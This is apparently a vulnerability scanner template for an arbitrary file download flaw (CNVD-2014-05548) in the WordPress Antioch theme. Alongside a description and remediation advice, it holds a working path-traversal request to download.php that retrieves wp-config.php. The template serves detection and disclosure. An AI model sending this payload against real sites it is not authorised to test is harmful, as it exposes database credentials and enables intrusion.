id: CNVD-2014-05548
info:
  name: wordpress Theme Antioch_1.0_Read any file
  author:
  - l0ne1y
  description: |-
    WordPress Theme Antioch 'download.php' arbitrary file download vulnerability
    WordPress is a blogging platform developed using PHP language. Users can set up their own blogs on servers that support PHP and MySQL databases.

    WordPress Antioch Theme 'download.php' has an arbitrary file download vulnerability. An attacker can use this vulnerability to download arbitrary files from the web server to obtain sensitive information.
  severity: high
  remediation: |-
    Official fix:
    1. It is recommended that users go to the official website to obtain the latest patches or the latest version of the program: http://www.wordpress.org

    Temporary fix:
    1. Filter \".\" so that users cannot go back to the upper directory in the URL.
    2. Regular matching strictly determines the format of user input parameters, hard-codes or uniformly encodes the file name parameters passed by the user, performs whitelist control on file types, and rejects parameters containing malicious characters or null characters.
    3. Prohibit the system from providing directory traversal services, such as: php.ini configures open_basedir to limit file access scope.
    4. Save the file path to the database and let the user submit the file corresponding to the ID to download the file.
    5. Verify permissions before users download files.
requests:
- matchers:
  - type: dsl
    dsl:
    - status_code==200 && contains(body,"<?php") && contains(body,"wp-config.php")
  matchers-condition: and
  path:
  - '{{BaseURL}}/wp-content/themes/antioch/lib/scripts/download.php?file=../../../../../wp-config.php'
  method: GET
